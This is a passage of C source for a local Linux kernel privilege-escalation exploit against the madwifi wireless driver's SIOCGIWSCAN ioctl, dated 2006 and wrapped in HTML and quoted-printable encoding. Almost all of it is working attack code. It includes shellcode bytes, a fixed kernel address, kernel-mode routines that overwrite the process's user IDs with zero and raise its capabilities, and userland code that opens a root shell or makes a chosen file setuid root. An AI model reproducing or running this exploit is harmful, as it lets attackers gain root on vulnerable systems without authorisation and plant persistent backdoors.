+testing<BR>*<BR>*=20
+                  TODO: release process' locks so that system remains =
+stable (or=20
+                  at least hack the task_struct to get rid of the=20
+                  BUG()s)<BR>*<BR>* Version =
+0.5<BR>*/<BR><BR><BR>#include=20
+                  &lt;sys/types.h&gt;<BR>#include=20
+                  &lt;sys/socket.h&gt;<BR>#include=20
+                  =
+&lt;net/if.h&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>#incl=
+ude=20
+                  &lt;netinet/if_ether.h&gt;<BR>#include=20
+                  &lt;linux/unistd.h&gt;<BR>#include=20
+                  &lt;sys/mman.h&gt;<BR>#include =
+&lt;sys/stat.h&gt;<BR>#include=20
+                  &lt;stdlib.h&gt;<BR>#include =
+&lt;unistd.h&gt;<BR>#include=20
+                  &lt;stdio.h&gt;<BR>#include =
+&lt;string.h&gt;<BR>#include=20
+                  &lt;sys/ioctl.h&gt;<BR>#include =
+&lt;fcntl.h&gt;<BR>#include=20
+                  &lt;assert.h&gt;<BR>#include =
+&lt;errno.h&gt;<BR>#include=20
+                  &lt;stdint.h&gt;<BR>#include =
+&lt;getopt.h&gt;<BR><BR>//=20
+                  #include "iwlib.h"<BR>/* defs from wireless.h and =
+iwlib.h=20
+                  */<BR><BR>#define=20
+                  =
+IW_SCAN_MAX_DATA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096<BR>#=
+ifndef=20
+                  __user<BR>#define __user<BR>#endif<BR><BR>#define NOPS =
+
+                  0x90909090<BR><BR>#define TASK_SIZE =
+0xC0000000<BR><BR>#define=20
+                  SIOCSIWSCAN&nbsp;&nbsp;&nbsp;&nbsp;=20
+                  =
+0x8B18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  trigger scanning (list cells) */<BR>#define=20
+                  SIOCGIWSCAN&nbsp;&nbsp;&nbsp;&nbsp;=20
+                  =
+0x8B19&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  get scanning results=20
+                  =
+*/<BR><BR>struct&nbsp;&nbsp;iw_point<BR>{<BR>&nbsp;&nbsp;void=20
+                  __user&nbsp;&nbsp;=20
+                  *pointer;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* =
+Pointer to=20
+                  the data&nbsp;&nbsp;(in user space)=20
+                  =
+*/<BR>&nbsp;&nbsp;__u16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=20
+                  =
+length;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*=20
+                  number of fields or size in bytes=20
+                  =
+*/<BR>&nbsp;&nbsp;__u16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=20
+                  =
+flags;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  Optional params */<BR>};<BR><BR>union&nbsp;&nbsp;=20
+                  iwreq_data<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;struct =
+iw_point=20
+                  =
+data;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=20
+                  /* Other large parameters=20
+                  =
+*/<BR>};<BR><BR>struct&nbsp;&nbsp;iwreq<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;union<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;ifrn_name[=
+IFNAMSIZ];&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  if name, e.g. "eth0"=20
+                  =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}=20
+                  =
+ifr_ifrn;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  Data part (defined just above)=20
+                  =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;union&nbsp;&nbsp;=20
+                  =
+iwreq_data&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;u;<BR>};<BR><BR>#define=20
+                  IFNAME "ath0"<BR><BR>/* This magic address will pass =
+encode_ie=20
+                  in madwifi<BR>* '3' is 0x33!=20
+                  =
+*/<BR>#define&nbsp;&nbsp;&nbsp;&nbsp;KSCADDR&nbsp;&nbsp;&nbsp;&nbsp;0x333=
+33333<BR><BR>#define=20
+                  USCADDR 0x50000000<BR><BR>/* stringification =
+*/<BR>#define=20
+                  xstr(s) str(s)<BR>#define str(s) #s<BR><BR>#define =
+KSTACKADDR=20
+                  0x60000100<BR><BR>#define=20
+                  PGS&nbsp;&nbsp;&nbsp;&nbsp;(4096)<BR><BR>/* 4046 if 4K =
+STACK=20
+                  is defined */<BR>#define=20
+                  =
+THREAD_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;=20
+                  (8192)<BR>#define=20
+                  =
+THREAD_SIZE8K&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(8192)<BR>#d=
+efine=20
+                  =
+THREAD_SIZE4K&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(4096)<BR><B=
+R>#define=20
+                  __syscall_return(type, res) \<BR>do {=20
+                  \<BR>&nbsp;&nbsp;&nbsp;&nbsp;if ((unsigned long)(res) =
+&gt;=3D=20
+                  (unsigned long)(-(128 + 1))) {=20
+                  =
+\<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;errno =3D=20
+                  -(res);=20
+                  =
+\<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res =3D -1;=20
+                  \<BR>&nbsp;&nbsp;&nbsp;&nbsp;}=20
+                  \<BR>&nbsp;&nbsp;&nbsp;&nbsp;return (type) (res); =
+\<BR>} while=20
+                  (0)<BR><BR>#define patchsc_with_addr(sc, addr) \<BR>do =
+{=20
+                  \<BR>&nbsp;&nbsp;&nbsp;&nbsp;*((void=20
+                  (**)())(sc+1))=3Daddr;\<BR>} while=20
+                  (0)<BR><BR>void&nbsp;&nbsp;&nbsp;&nbsp;*installsc(void =
+
+                  *scaddr, void *sh, unsigned int=20
+                  len);<BR>void&nbsp;&nbsp;&nbsp;&nbsp;*getsc(char =
+*filename,=20
+                  uint32_t *len);<BR><BR>//_syscall3(int, myioctl2, int, =
+d, int,=20
+                  request, struct iwreq *, toto);<BR><BR>// jmp =
+-2<BR>//static=20
+                  char sc[]=3D"\xeb\xfe\xeb\xfe\xeb\xfe";<BR>// mov [0], =
+
+                  eax<BR>//static char =
+sc[]=3D"\xA3\x00\x00\x00\x00";<BR>//=20
+                  exit(42);<BR>//static char=20
+                  =
+sc[]=3D"\x31\xC0\x40\xBB\x69\x7A\x00\x00\xCD\x80";<BR>// mov=20
+                  eax, 0x01020304; jmp eax<BR><BR>char=20
+                  sc[128]=3D"\xB8\x04\x03\x02\x01\xFF\xE0";<BR>uid_t =
+puid;<BR>int=20
+                  =
+noexit=3D0;<BR><BR>char&nbsp;&nbsp;&nbsp;&nbsp;*chmodfile=3DNULL;<BR>char=
+=20
+                  chmodname[1024];<BR><BR>unsigned int=20
+                  =
+stackheur=3D0;<BR>char&nbsp;&nbsp;&nbsp;&nbsp;*ifname=3DIFNAME;<BR><BR>st=
+ruct=20
+                  task_struct;<BR><BR>typedef struct=20
+                  {<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned long seg;<BR>}=20
+                  mm_segment_t;<BR><BR>mm_segment_t =
+addr_limit;<BR><BR>/*=20
+                  thread_info.h */<BR>struct thread_info=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct=20
+                  =
+task_struct&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*task;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  main task structure =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;struct=20
+                  =
+exec_domain&nbsp;&nbsp;&nbsp;&nbsp;*exec_domain;&nbsp;&nbsp;&nbsp;&nbsp;/=
+*=20
+                  execution domain =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned=20
+                  =
+long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flags;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  low level flags */<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned =
+
+                  =
+long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  thread-synchronous flags=20
+                  =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;__u32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cpu;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;/*=20
+                  current CPU=20
+                  =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;preempt_count;&nbsp;&nbsp;&nbsp;&nbsp;/* =
+
+                  0 =3D&gt; preemptable, &lt;0 =3D&gt; BUG=20
+                  =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;mm_segment_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;addr_limit;<BR>&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  continued */<BR>};<BR><BR>int sys_ioctl(int d, int =
+request,=20
+                  struct iwreq *toto) <BR>{ =
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;long=20
+                  __res; <BR>&nbsp;&nbsp;&nbsp;&nbsp;__asm__ volatile =
+("push=20
+                  %%ebx ; movl %2,%%ebx ; int $0x80 ; pop %%ebx"=20
+                  =
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;:=20
+                  "=3Da" (__res)=20
+                  =
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;:=20
+                  "0" (__NR_ioctl),"ri" ((long)(d)),"c" =
+((long)(request)),=20
+                  =
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;"d"=20
+                  ((long)(toto)) : "memory");=20
+                  =
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;__syscall_return(int,__res);=20
+                  <BR>}<BR><BR>struct iretstack=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;uint32_t&nbsp;&nbsp;&nbsp;&nbsp;eip;<BR>&nbs=
+p;&nbsp;&nbsp;&nbsp;uint32_t&nbsp;&nbsp;&nbsp;&nbsp;cs;<BR>&nbsp;&nbsp;&n=
+bsp;&nbsp;uint32_t&nbsp;&nbsp;&nbsp;&nbsp;eflags;<BR>&nbsp;&nbsp;&nbsp;&n=
+bsp;uint32_t&nbsp;&nbsp;&nbsp;&nbsp;esp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;uint3=
+2_t&nbsp;&nbsp;&nbsp;&nbsp;ss;<BR>}=20
+                  =
+__attribute__((packed));<BR><BR>void&nbsp;&nbsp;&nbsp;&nbsp;build_iretsta=
+ck(struct=20
+                  iretstack *dest, uint32_t eip)=20
+                  =
+{<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;dest-&gt;eip=3Deip;<BR>&nbsp;&nbsp;&nbsp=
+;&nbsp;asm("xorl=20
+                  %0,=20
+                  =
+%0\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"mov=20
+                  %%cs,=20
+                  =
+%0\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"pushf\n"<BR>&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"pop=20
+                  =
+%%esi\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl=20
+                  %%esi,=20
+                  =
+%1\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl=20
+                  %%esp,=20
+                  =
+%2\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"xorl=20
+                  %3,=20
+                  =
+%3\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"mov=20
+                  %%ss,=20
+                  =
+%3\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:=20
+                  "=3Dr" (dest-&gt;cs),&nbsp;&nbsp;"=3Dr" =
+(dest-&gt;eflags), "=3Dr"=20
+                  (dest-&gt;esp), "=3Dr"=20
+                  =
+(dest-&gt;ss)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:<BR>&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:=20
+                  "esi"<BR>&nbsp;&nbsp;&nbsp;&nbsp;);<BR>}<BR><BR>/* =
+userland=20
+                  function, called after ksc_func=20
+                  */<BR>void&nbsp;&nbsp;&nbsp;&nbsp;usc_func(void)=20
+                  {<BR>&nbsp;&nbsp;&nbsp;&nbsp;int=20
+                  ret;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("[+] =
+Address space=20
+                  limit heuristic: 0x%lX\n",=20
+                  addr_limit.seg);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if =
+(getuid()=20
+                  =3D=3D 0)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[+]=20
+                  =
+Success\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if=20
+                  (chmodfile !=3D NULL)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;ret=3Dchown(chmodfile,=20
+                  0,=20
+                  =
+0);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;if=20
+                  (ret =3D=3D -1)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("chown");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ex=
+it(1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;}=20
+                  =
+else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret=3Dchmod(chmodfile,=20
+                  =
+04755);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;if=20
+                  (ret =3D=3D -1)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("chmod");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ex=
+it(1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;if=20
+                  (noexit)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[+]=20
+                  Sleeping=20
+                  =
+forever\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(1)=20
+                  =
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep(10);<BR>&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}=20
+                  =
+else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  we may BUG() here...=20
+                  =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;}=20
+                  else=20
+                  =
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;execlp("/bin/sh",=20
+                  "sh", NULL);<BR>&nbsp;&nbsp;&nbsp;&nbsp;} else=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[-]=20
+                  =
+Failure\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(42);=
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>}<BR><BR>static=20
+                  inline struct thread_info *current_thread_info(__u32 =
+tsize)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct=20
+                  thread_info=20
+                  =
+*ti;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//__asm__("andl=20
+                  %%esp,%0; ":"=3Dr" (ti) : "0" (~(THREAD_SIZE -=20
+                  =
+1)));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__asm__("andl=20
+                  %%esp,%0; ":"=3Dr" (ti) : "0" (~(tsize -=20
+                  =
+1)));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return=20
+                  ti;<BR>}<BR><BR>/* Our kernel mode function=20
+                  */<BR>void&nbsp;&nbsp;&nbsp;&nbsp;ksc_func(void)=20
+                  {<BR>&nbsp;&nbsp;&nbsp;&nbsp;uid_t=20
+                  =
+*tsk;<BR>&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  Lame heuristic to try and detect 4K stacks=20
+                  */<BR>&nbsp;&nbsp;&nbsp;&nbsp;if (stackheur)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr_limit.seg=3Dcur=
+rent_thread_info(THREAD_SIZE4K)-&gt;addr_limit.seg;<BR>&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if=20
+                  (addr_limit.seg =3D=3D=20
+                  =
+TASK_SIZE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;tsk=3D(uid_t=20
+                  *)=20
+                  =
+(current_thread_info(THREAD_SIZE4K)-&gt;task);<BR>&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tsk=3D(uid_t=20
+                  *)=20
+                  =
+(current_thread_info(THREAD_SIZE8K)-&gt;task);<BR>&nbsp;&nbsp;&nbsp;&nbsp=
+;}=20
+                  else=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr_limit.seg=3Dcur=
+rent_thread_info(THREAD_SIZE8K)-&gt;addr_limit.seg;<BR>&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tsk=3D(uid_t=20
+                  *)=20
+                  =
+(current_thread_info(THREAD_SIZE8K)-&gt;task);<BR>&nbsp;&nbsp;&nbsp;&nbsp=
+;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  look for uid,euid,suid,fsuid=20
+                  */<BR>&nbsp;&nbsp;&nbsp;&nbsp;while( (tsk[0] !=3D =
+puid) || (tsk=20
+                  [1] !=3D puid) || (tsk [2] !=3D puid) || (tsk [3] !=3D =
+puid) )=20
+                  =
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tsk++;<BR><BR>&nbsp;&=
+nbsp;&nbsp;&nbsp;/*=20
+                  patch uids and gids=20
+                  =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;//tsk[0]=3Dtsk[1]=3Dtsk[2]=3Dtsk[3]=3D0;<BR=
+>&nbsp;&nbsp;&nbsp;&nbsp;memset(tsk,=20
+                  0, 8*sizeof(uid_t));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;/* =
+patch=20
+                  capabilities=20
+                  =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;tsk+=3D9;<BR>&nbsp;&nbsp;&nbsp;&nbsp;memset=
+(tsk,=20
+                  0xFFFFFFFF ,=20
+                  =
+3*sizeof(uid_t));<BR>&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;=
+asm(".intel_syntax=20
+                  =
+noprefix\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"sti\n"<BR=
+>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"mov&nbsp;&nbsp;esp,=20
+                  " xstr(KSTACKADDR)=20
+                  =
+"\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"iret\n"<BR>&nbsp=
+;&nbsp;&nbsp;&nbsp;".att_syntax=20
+                  =
+noprefix\n");<BR>}<BR><BR>int&nbsp;&nbsp;&nbsp;&nbsp;main(int=20
+                  argc, char **argv)=20
+                  =
+{<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;skfd,=20
+                  counter=3D0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;struct=20
+                  =
+iwreq&nbsp;&nbsp;&nbsp;&nbsp;wrq;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;unsigned=20
+                  char *buffer =3D=20
+                  =
+NULL;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  Results=20
+                  =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;buflen=20
+                  =3D IW_SCAN_MAX_DATA; /* Min for compat WE&lt;17=20
+                  */<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("Madwifi =
+SIOCGIWSCAN=20
+                  ioctl local=20
+                  =
+exploit\n\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"(C)=20
+                  2006 Julien TINNES and Laurent=20
+                  BUTTI\n\n");<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;/* support =
+-c on=20
+                  self */<BR>&nbsp;&nbsp;&nbsp;&nbsp;if (( geteuid() =
+=3D=3D 0)=20
+                  &amp;&amp; (getuid() !=3D0))=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setuid(0);<BR>&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setgid(0);<BR>&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;execlp("/bin/sh",=20
+                  "sh",=20
+                  =
+NULL);<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;for=20
+                  (;;) =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int=20
+                  option_index =3D 0,=20
+                  =
+c;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;static=20
+                  struct option long_options[]=20
+                  =
+=3D<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{"stackheur", =
+
+                  0, 0,=20
+                  =
+'s'},<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;{"help",=20
+                  0, 0,=20
+                  =
+'h'},<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;{"interface",=20
+                  1, 0,=20
+                  =
+'i'},<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;{"chown/chmod",=20
+                  1, 0,=20
+                  =
+'c'},<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;{"noexit",=20
+                  1, 0,=20
+                  =
+'n'},<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;{0,0,0,0}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;};<B=
+R><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c=20
+                  =3D getopt_long (argc, argv, "nc:shi:", long_options,=20
+                  =
+&amp;option_index);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;if=20
+                  (c =3D=3D=20
+                  =
+-1)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch=20
+                  =
+(c)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case=20
+                  =
